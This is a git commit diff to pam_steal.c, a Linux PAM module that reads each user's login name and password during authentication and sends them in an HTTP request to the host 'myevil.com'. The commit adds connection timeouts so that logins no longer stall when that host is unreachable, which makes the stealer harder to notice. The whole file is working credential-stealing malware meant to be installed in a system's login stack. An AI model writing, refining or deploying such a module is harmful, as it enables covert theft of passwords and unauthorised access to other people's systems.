b355389f4b7e9f2c53a321627ebd192c836fe270
Ali <allyshka@users.noreply.github.com>
2016-01-20 12:47:42 +0300

    Added timeout to connection
    Added timeout to connect for fix login stuck if host or ip address is unreachable.

--- pam_steal/pam_steal.c
+++ pam_steal/pam_steal.c
@@ -16,59 +16,71 @@
 PAM_EXTERN int pam_sm_authenticate(pam_handle_t * pamh, int flags
                                    ,int argc, const char **argv)
 {
-    int retval;
-    const char *username;
-    const void *password;
+  int retval;
+  const char *username;
+  const void *password;
+  struct timeval  timeout;
+  timeout.tv_sec = 1;
+  timeout.tv_usec = 0;
 
-    retval = pam_get_user(pamh, &username, NULL);
-    if (retval != PAM_SUCCESS) {
-        return PAM_IGNORE;
+  retval = pam_get_user(pamh, &username, NULL);
+  if (retval != PAM_SUCCESS) {
+      return PAM_IGNORE;
+  }
+
+  retval = pam_get_item(pamh, PAM_AUTHTOK, &password);
+  if (retval != PAM_SUCCESS) {
+      return PAM_IGNORE;
+  }
+
+  int portno =        80;
+  char *host =        "myevil.com";
+  char *message_fmt = "GET /?login=%s&passw=%s HTTP/1.0\r\n\r\n";
+
+  struct hostent *server;
+  struct sockaddr_in serv_addr;
+  int sockfd, bytes, sent, total;
+  char message[1024];
+
+  sprintf(message,message_fmt,username,password);
+
+  sockfd = socket(AF_INET, SOCK_STREAM, 0);
+  server = gethostbyname(host);
+
+  setsockopt (sockfd, SOL_SOCKET, SO_RCVTIMEO, (char *)&timeout,
+              sizeof(timeout));
+
+  setsockopt (sockfd, SOL_SOCKET, SO_SNDTIMEO, (char *)&timeout,
+              sizeof(timeout));
+
+  if (server != NULL) {
+    memset(&serv_addr,0,sizeof(serv_addr));
+    serv_addr.sin_family = AF_INET;
+    serv_addr.sin_port = htons(portno);
+    memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);
+
+    if(connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr)) < 0) {
+     return PAM_IGNORE;
+    } else {
+      total = strlen(message);
+      sent = 0;
+      do {
+          bytes = write(sockfd,message+sent,total-sent);
+          if (bytes == 0)
+              break;
+          sent+=bytes;
+      } while (sent < total);
     }
 
-    retval = pam_get_item(pamh, PAM_AUTHTOK, &password);
-    if (retval != PAM_SUCCESS) {
-        return PAM_IGNORE;
-    }
+    close(sockfd);
+  }
 
-    int portno =        80;
-    char *host =        "myevil.com";
-    char *message_fmt = "GET /?login=%s&passw=%s HTTP/1.0\r\n\r\n";
-
-    struct hostent *server;
-    struct sockaddr_in serv_addr;
-    int sockfd, bytes, sent, total;
-    char message[1024];
-
-    sprintf(message,message_fmt,username,password);
-
-    sockfd = socket(AF_INET, SOCK_STREAM, 0);
-    server = gethostbyname(host);
-    if (server != NULL) {
-        memset(&serv_addr,0,sizeof(serv_addr));
-        serv_addr.sin_family = AF_INET;
-        serv_addr.sin_port = htons(portno);
-        memcpy(&serv_addr.sin_addr.s_addr,server->h_addr,server->h_length);
-
-        connect(sockfd,(struct sockaddr *)&serv_addr,sizeof(serv_addr));
-
-        total = strlen(message);
-        sent = 0;
-        do {
-            bytes = write(sockfd,message+sent,total-sent);
-            if (bytes == 0)
-                break;
-            sent+=bytes;
-        } while (sent < total);
-
-        close(sockfd);
-    }
-
-    return PAM_IGNORE;
+  return PAM_IGNORE;
 }
 
 
 PAM_EXTERN int pam_sm_setcred(pam_handle_t *pamh, int flags,
                               int argc, const char **argv)
 {
-    return PAM_IGNORE;
+  return PAM_IGNORE;
 }
